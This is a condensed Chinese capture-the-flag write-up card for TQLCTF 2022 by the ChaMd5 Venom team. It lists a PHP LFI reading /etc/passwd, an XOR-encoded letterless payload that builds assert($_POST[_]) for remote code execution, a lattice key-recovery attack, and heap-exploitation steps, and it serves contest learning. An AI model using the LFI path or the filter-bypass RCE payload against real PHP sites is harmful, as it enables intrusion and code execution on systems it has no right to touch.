---
title: "TQLCTF WriteUp - ChaMd5 Venom"
category: web
tags: ["TQLCTF", "web", "php-lfi", "php-template-write", "xor-rce", "lattice-attack"]
signals: ["TQLCTF 2022", "php-lfi", "php-template-write", "xor-rce", "lattice-attack", "nesemu-exploit", "web_unknown", "TQLCTF", "ChaMd5", "Venom", "PHP", "RCE", "lattice", "Nemu"]
difficulty: medium
source: "https://www.ctfiot.com/27072.html"
tools: ["PHP"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# TQLCTF WriteUp - ChaMd5 Venom

> 赛事：TQLCTF 2022 | 方向：web | 难度：medium | 工具：PHP

## 一句话总结

TQLCTF 2022 ChaMd5 Venom：PHP 无字母 RCE + 128 维 lattice + Nemu 调试器栈迁移。

## 攻击链

1. /get_pic.php?image=/etc/passwd LFI
2. 注册 + 4 字段写入 sandbox/<md5(user)>.php
3. user=1)/* website=*/;__PUNC__/* punctuation=无字母数字 RCE
4. $_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`')='assert
5. $__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']')='_POST
6. $_($___[_]) → assert($_POST[_])
7. Lattice attack: 128 维 IntegerLattice LLL reduce + Gram-Schmidt
8. grad_desc(0.7, 128, samples) 梯度下降 4 维找 4 个短向量
9. babai pklll gram pkgram target 还原私钥
10. pwn menu: add/delete + size 负数 + 伪造 fake_chunk 0x70
11. tcache stash unlink + main_arena leak
12. nemu'' 调试器: 写 0x86A3FC0 地址到 libc 区域 + og=0x4527a one_gadget
13. edit_score' race 改 write_time

## 关键 payload

```
assert($_POST[_])  // 无字母 RCE
```

## 经验教训

LLL + 梯度下降 4 维可以恢复 lattice 私钥的 4 个基向量；pwnable 中 nesemu 是稀有 IoT 模拟。

## 标签

php-lfi、php-template-write、xor-rce、lattice-attack、nesemu-exploit

## 参考来源

- https://www.ctfiot.com/27072.html
- 原文件：TQLCTF-WriteUp.full.md
